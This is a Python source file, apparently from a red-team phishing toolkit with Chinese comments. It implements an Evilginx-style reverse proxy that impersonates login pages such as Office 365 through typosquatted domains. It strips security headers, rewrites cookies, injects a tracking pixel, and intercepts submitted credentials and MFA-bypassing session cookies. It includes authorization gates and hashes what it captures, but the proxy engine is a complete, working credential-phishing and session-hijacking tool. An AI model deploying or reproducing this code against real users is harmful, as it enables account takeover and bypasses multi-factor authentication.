#!/usr/bin/env python3
"""phishlet-proxy — Evilginx2 式 phishlet 声明式反向代理(P1 借鉴)
核心改进: 目标网站代理规则从硬编码变成 phishlet JSON 声明——
  新目标 = 写一个 phishlet 文件,不改代码。
phishlet 结构(Evilginx 兼容子集):
{
  "name": "office365",
  "author": "spectre",
  "proxy_host": "login.microsooft.com",     # 攻击者域(钓鱼用)
  "target_host": "login.microsoft.com",     # 真实目标
  "implicit_proxy": true,                   # 所有子域都代理
  "sub_filters": {                          # 响应内容重写规则
    "login.microsoft.com": ["login.microsooft.com"]
  },
  "session": {                              # 会话捕获(Evilginx 核心能力)
    "cookie_names": ["ESTSAUTHPERSISTENT", "ESTSAUTH", "SignInStateCookie"],
    "auth_path": "/success"
  },
  "credential_fields": ["loginfmt", "passwd"]  # 凭据字段拦截
}
用法:
  phishlet-proxy serve --listen :8443 --phishlet /opt/tools/phishlets/office365.json
  phishlet-proxy list  # 列出可用 phishlet
  phishlet-proxy init  # 生成样例 phishlet 到数据根 phishlets/  (CS15-7)
"""
import sys, os, json, time, hashlib, re


from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from urllib.request import Request
from urllib.error import HTTPError
from _common import _data_root, scope_gate_full, edusrc_gate_phish as edusrc_gate, cred_hash as _cred_hash, RESP_STRIP_HEADERS  # CS69-2/CS72-3: 导入归顶


# ============================================================
# phishlet 加载
# ============================================================


def load_phishlet(path):
    edusrc_gate((path,))
    pl = json.load(open(path))
    required = ['name', 'proxy_host', 'target_host']
    for k in required:
        if k not in pl:
            raise ValueError(f'phishlet missing {k}')
    return pl

def list_phishlets(directory):
    out = []
    if not os.path.isdir(directory):
        print(f'[phishlet-proxy] 目录不存在: {directory}(可先 init 生成样例)',
              file=sys.stderr)
        return out
    for fn in os.listdir(directory):
        if fn.endswith('.json'):
            try:
                pl = load_phishlet(os.path.join(directory, fn))
                out.append({'file': fn, 'name': pl['name'],
                            'target': pl['target_host'],
                            'cookies': len(pl.get('session', {}).get('cookie_names', []))})
            except Exception:
                continue
    return out

# ============================================================
# 代理引擎(phishlet 驱动)
# ============================================================

def make_handler(phishlet, db_file):
    target_host = phishlet['target_host']
    proxy_host = phishlet['proxy_host']
    sub_filters = phishlet.get('sub_filters', {})
    cookie_names = phishlet.get('session', {}).get('cookie_names', [])
    cred_fields = phishlet.get('credential_fields', [])
    target_base = phishlet.get('target_url', f'https://{target_host}')

    class PhishletHandler(BaseHTTPRequestHandler):
        # R32D90-OBS2: 匿名化自动 Server 头(类属性覆盖, 手动加头会双份)。
        server_version = 'phishlet-proxy/1'
        sys_version = ''

        def version_string(self):
            return self.server_version  # CS74-N2: 消尾随空格(gateway 先例)

        def log(self, msg):
            print(f'[phishlet:{phishlet["name"]}] {msg}', flush=True)

        def track(self, kind, uid, extra=None):
            # F36: 同库并发方必须持同一把锁——phish-track V6c 只锁自己,
            # 此处无锁 load-modify-save 曾致 599/600 事件丢失(exploit PoC)。
            ev = {'kind': kind, 'uid': uid,
                  'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}
            if extra:
                ev.update(extra)
            import fcntl
            # R32D88-F1(P0): 父目录由 serve 启动自检预建(CS72-6: 同 phish-proxy)。
            with open(db_file + '.lock', 'w') as lf:
                fcntl.flock(lf, fcntl.LOCK_EX)
                try:
                    try:
                        cur = json.load(open(db_file))
                    except Exception:
                        cur = {'events': []}
                    cur['events'].append(ev)
                    json.dump(cur, open(db_file, 'w'), indent=1, ensure_ascii=False)
                finally:
                    fcntl.flock(lf, fcntl.LOCK_UN)
            self.log(f'{kind} uid={uid} {extra or ""}')

        def proxy(self, method='GET', body=None):
            """转发到目标——按 phishlet 规则重写"""
            url = target_base + self.path
            headers = {}
            for key in ['Accept', 'Accept-Language', 'User-Agent', 'Content-Type', 'Cookie']:
                if key in self.headers:
                    headers[key] = self.headers[key]
            # Cookie 域替换:我们的域 cookie 当作目标的发
            headers['Host'] = target_host
            headers['Accept-Encoding'] = 'identity'
            headers['Referer'] = f'https://{target_host}/'

            try:
                import ssl
                from urllib.request import build_opener, HTTPSHandler, HTTPRedirectHandler
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

                # 不跟随重定向——302 的 Set-Cookie(session!)必须原样拿到
                class NoRedirect(HTTPRedirectHandler):
                    def redirect_request(self, *a, **kw): return None
                opener = build_opener(NoRedirect, HTTPSHandler(context=ctx))

                req = Request(url, data=body, headers=headers, method=method)
                resp = opener.open(req, timeout=15)
                return resp.status, dict(resp.headers), resp.read()
            except HTTPError as e:
                # 3xx 会走这里(NoRedirect)——headers 里含 Set-Cookie
                return e.code, dict(e.headers), e.read()
            except Exception as e:
                return 502, {}, str(e).encode()

        def rewrite(self, status, headers, body):
            """按 phishlet 重写响应: 剥安全头+域替换+注入追踪"""
            # R32D88-F3/CS72-3: 大小写不敏感 STRIP 单源 _common(此前
            # 字面 pop 且缺 public-key-pins)。
            for h in [k for k in headers if k.lower() in RESP_STRIP_HEADERS]:
                headers.pop(h, None)

            ct = next((v for k, v in headers.items() if k.lower() == 'content-type'), '')  # R32D88-F2
            ct_l = ct.lower()  # R32D89: 值大小写不敏感
            if 'text/html' in ct_l or 'javascript' in ct_l:
                text = body.decode('utf-8', errors='replace')
                # sub_filters: 目标域→代理域(双向)
                text = text.replace(f'https://{target_host}', f'http://{proxy_host}')
                text = text.replace(f'https://{proxy_host}', f'http://{proxy_host}')
                for src, dsts in sub_filters.items():
                    for dst in dsts:
                        text = text.replace(src, dst)
                # 追踪像素
                pixel = f'<img src="http://{proxy_host}/o/proxy.gif" style="display:none">'
                if '</body>' in text:
                    text = text.replace('</body>', f'{pixel}</body>')
                body = text.encode()

            # Set-Cookie 域重写(目标的 cookie 种到我们的域)
            if any(k.lower() == 'set-cookie' for k in headers):  # CS73-F4: 门同大小写不敏感
                raw = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')  # CS72-7: 大小写不敏感(同 ct)
                if isinstance(raw, str):
                    # R32D91-OBS-A/CS75-F3: 剥 origin :port 尾并重写为 proxy
                    # 域——锚定属性边界(?:^|;\s*)防 somedomain= 误中(F-3 实证),
                    # 保留原属性名大小写; re.sub 无匹配原样返回无需预检(F-4)。
                    raw = re.sub(r'(?i)(?:(?<=^)|(?<=;\s))([Dd]omain=)[^;]*(?::\d+)?',
                                 lambda m: m.group(1) + (proxy_host.rpartition(':')[0] or proxy_host), raw)  # CS75-F3: 唯一捕获组=属性名
                    raw = re.sub(r';\s*[Ss]ecure', '', raw)  # 我们是 http
                    raw = re.sub(r';\s*[Ss]ameSite=\w+', '; SameSite=None', raw)
                    # R32D90-F1: 先删异大小写原键再设规范键——此前直赋
                    # headers['Set-Cookie'] 在原键为 set-cookie/SET-COOKIE
                    # 时是新增键非替换, 出站双份冲突对。
                    for hk in [k for k in headers if k.lower() == 'set-cookie']:
                        headers.pop(hk, None)
                    headers['Set-Cookie'] = raw
            return status, headers, body

        def check_session_capture(self, headers):
            """检测目标响应里的 session cookie(Evilginx 核心: 拿 cookie 绕 MFA)"""
            raw = next((v for k, v in headers.items() if k.lower() == 'set-cookie'), '')  # CS73-F4
            if not raw:
                return None
            captured = {}
            for cn in cookie_names:
                m = re.search(f'{re.escape(cn)}=([^;]+)', raw)
                if m:
                    captured[cn] = m.group(1)
            return captured if captured else None

        def do_GET(self):
            u = urlparse(self.path)

            # 追踪像素
            if u.path.endswith('.gif'):
                import base64
                self.track('open', 'proxy', {'ip': self.client_address[0]})
                gif = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.send_header('Content-Length', str(len(gif)))
                self.end_headers()
                self.wfile.write(gif)
                return

            # 成功页(凭据提交后)
            if u.path == '/success':
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<html><body><h2>Sign-in successful. Redirecting...</h2><script>setTimeout(function(){location.href="/"},3000)</script></body></html>')
                return

            status, headers, body = self.proxy('GET')
            captured = self.check_session_capture(headers)
            if captured:
                # cookie 捕获=完整会话(MFA 已过)——只记哈希指纹+名称
                fp = {k: hashlib.sha256(v.encode()).hexdigest()[:12] for k, v in captured.items()}
                self.track('session-captured', 'proxy', {'cookies': list(captured.keys()), 'fingerprints': fp})
            status, headers, body = self.rewrite(status, headers, body)
            self._respond(status, headers, body)

        def _respond(self, status, headers, body):
            # CS69-5/CS70-1: respond 诗节×3 收口(跳过逐跳头+重算长度)——
            # DI 批次替换误把本函数体也换成自调用(RecursionError), 此为真身。
            self.send_response(status)
            # R32D88-F4: 剥 origin Server/Date(同 phish-proxy, 双份畸形)。
            for k, v in headers.items():
                if k.lower() not in ('transfer-encoding', 'content-length', 'server', 'date'):
                    self.send_header(k, v)
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_POST(self):
            # CS70-2/CS71-1: 族先例两段式(phish-track/proxy 同款——
            # 400 畸形/413 过大分报, 1 MiB 界, 空头 or 0 容空体)。
            try:
                length = int(self.headers.get('Content-Length', 0) or 0)
            except (ValueError, TypeError):
                self.send_response(400); self.end_headers()
                return
            if length < 0 or length > 1_048_576:
                self.send_response(413); self.end_headers()
                return
            body = self.rfile.read(length) if length else b''
            qs = parse_qs(body.decode('utf-8', errors='replace'))

            # 凭据字段拦截(phishlet 声明哪些字段是凭据)
            captured_creds = {}
            for f in cred_fields:
                for k, v in qs.items():
                    if k.lower() == f.lower() and v:
                        captured_creds[f] = v[0]

            # F49: phishlet credential_fields 声明即凭据——此前额外要求
            # 键名含 passwd/pass/pwd,自定义字段(u/p/user)全部漏拦截
            if captured_creds:
                # 哈希即毁
                fp = _cred_hash(captured_creds)
                email = next((v for k, v in captured_creds.items() if '@' in v), '')
                self.track('submit', 'proxy', {
                    'cred_hash': fp,
                    'email_domain': email.split('@')[1] if '@' in email else '',
                    'ip': self.client_address[0]})
                # 转发原始凭据到目标(维持会话链——拿 session cookie 必须)
                status, headers, body = self.proxy('POST', body)
                captured = self.check_session_capture(headers)
                if captured:
                    fp2 = {k: hashlib.sha256(v.encode()).hexdigest()[:12] for k, v in captured.items()}
                    self.track('session-captured', 'proxy', {'cookies': list(captured.keys()), 'fingerprints': fp2})
                status, headers, body = self.rewrite(status, headers, body)
                self._respond(status, headers, body)
                return

            # 非凭据 POST(SSO 握手/CSRF/MFA)——直接转发
            status, headers, body = self.proxy('POST', body)
            captured = self.check_session_capture(headers)
            if captured:
                fp = {k: hashlib.sha256(v.encode()).hexdigest()[:12] for k, v in captured.items()}
                self.track('session-captured', 'proxy', {'cookies': list(captured.keys()), 'fingerprints': fp})
            status, headers, body = self.rewrite(status, headers, body)
            self._respond(status, headers, body)

        def log_message(self, *a):
            pass

    return PhishletHandler

def serve(listen, phishlet, db_file):
    edusrc_gate((phishlet.get('proxy_host', '') if isinstance(phishlet, dict) else '',))
    scope_gate_full()  # F10: 完整授权门(targets+exercise+window 三必填, CS37-F5)
    host, _, port = listen.rpartition(':')
    handler = make_handler(phishlet, db_file)
    # R32D88-F1: 启动自检事件库可写(凭据路径开箱即崩防线)。
    try:
        # CS72-5: 探库本体(append 试开)——此前只探 .lock, 库文件本身
        # 不可写(权限/只读挂载)时横幅仍报可写。
        os.makedirs(os.path.dirname(db_file) or '.', exist_ok=True)
        with open(db_file, 'a'):
            pass
        with open(db_file + '.lock', 'w') as lf:
            pass
    except OSError as e:
        print(f'[phishlet-proxy] FATAL: 事件库不可写 {db_file} — {e}', flush=True)
        sys.exit(1)
    print(f'[phishlet-proxy] {phishlet["name"]}: {listen} → {phishlet["target_host"]}', flush=True)
    print(f'[phishlet-proxy] session cookies: {phishlet.get("session", {}).get("cookie_names", [])}', flush=True)
    print(f'[phishlet-proxy] cred fields: {phishlet.get("credential_fields", [])}', flush=True)
    HTTPServer((host or '0.0.0.0', int(port or 8443)), handler).serve_forever()

# ============================================================
# 内置 phishlet 样例(参考模板)
# ============================================================

SAMPLE_PHISHLETS = {
    'office365': {
        'name': 'office365', 'author': 'spectre',
        'proxy_host': 'login.microsooft-auth.com',
        'target_host': 'login.microsoft.com',
        'target_url': 'https://login.microsoft.com',
        'sub_filters': {'login.microsoft.com': ['login.microsooft-auth.com']},
        'session': {'cookie_names': ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'brcap'],
                    'auth_path': '/success'},
        'credential_fields': ['loginfmt', 'passwd', 'login', 'password'],
    },
    'generic-sso': {
        'name': 'generic-sso', 'author': 'spectre',
        'proxy_host': 'sso.target-verify.co',
        'target_host': 'sso.target-corp.com',
        'target_url': 'https://sso.target-corp.com',
        'sub_filters': {},
        'session': {'cookie_names': ['sessionid', 'JSESSIONID', 'ASPXAUTH', 'PHPSESSID'],
                    'auth_path': '/success'},
        'credential_fields': ['username', 'password', 'email', 'passwd', 'loginfmt'],
    },
}

def write_samples(directory):
    os.makedirs(directory, exist_ok=True)
    for name, pl in SAMPLE_PHISHLETS.items():
        p = os.path.join(directory, f'{name}.json')
        json.dump(pl, open(p, 'w'), indent=1, ensure_ascii=False)
        print(f'  {p}')

if __name__ == '__main__':
    # R32D74-N1/CS55-F2: -h 永先(家族最高契约), 门在 -h 后、解析前
    # (畸形参 rc=2 先于 76 的族间不对称封堵)。
    if any(x in sys.argv[1:] for x in ('-h', '--help')):
        print(__doc__); sys.exit(0)
    edusrc_gate()
    # R32D42-P1/CS56-N1: 子命令归一——-h 已由上方门块处理(rc=0);
    # 未知/缺失子命令一律用法 rc=2。
    if len(sys.argv) < 2 or sys.argv[1] not in ('serve', 'list', 'init'):
        print(__doc__); sys.exit(2)
    if sys.argv[1] == 'serve':
        # R32D92-N1: 成对解析+未知旗标拒 rc=2(此前静默忽略)+--port 别名。
        PAIR_FLAGS = ('--listen', '--port', '--phishlet', '--db')
        toks, flags = sys.argv[2:], {}
        i = 0
        while i < len(toks):
            t = toks[i]
            if t in PAIR_FLAGS and i + 1 < len(toks):
                flags[t] = toks[i + 1]; i += 2
            else:
                print(f'未知/缺值参数: {t}(用法: -h)', file=sys.stderr); sys.exit(2)
        listen = flags.get('--listen') or (':' + flags['--port'] if '--port' in flags else ':8443')
        pl_path = flags.get('--phishlet')
        db = flags.get('--db') or os.path.join(_data_root(), 'phish/track.json')  # CS9-N1
        if not pl_path:
            print('serve 需要 --phishlet <json>', file=sys.stderr); sys.exit(1)
        serve(listen, load_phishlet(pl_path), db)
    elif sys.argv[1] == 'list':
        d = '--dir' in sys.argv and sys.argv[sys.argv.index('--dir') + 1] or os.path.join(_data_root(), 'phishlets')
        for pl in list_phishlets(d):
            print(f"{pl['name']:>15} → {pl['target']} ({pl['cookies']} session cookies)")
    elif sys.argv[1] == 'init':
        d = '--dir' in sys.argv and sys.argv[sys.argv.index('--dir') + 1] or os.path.join(_data_root(), 'phishlets')
        write_samples(d)
        print(f'sample phishlets → {d}')
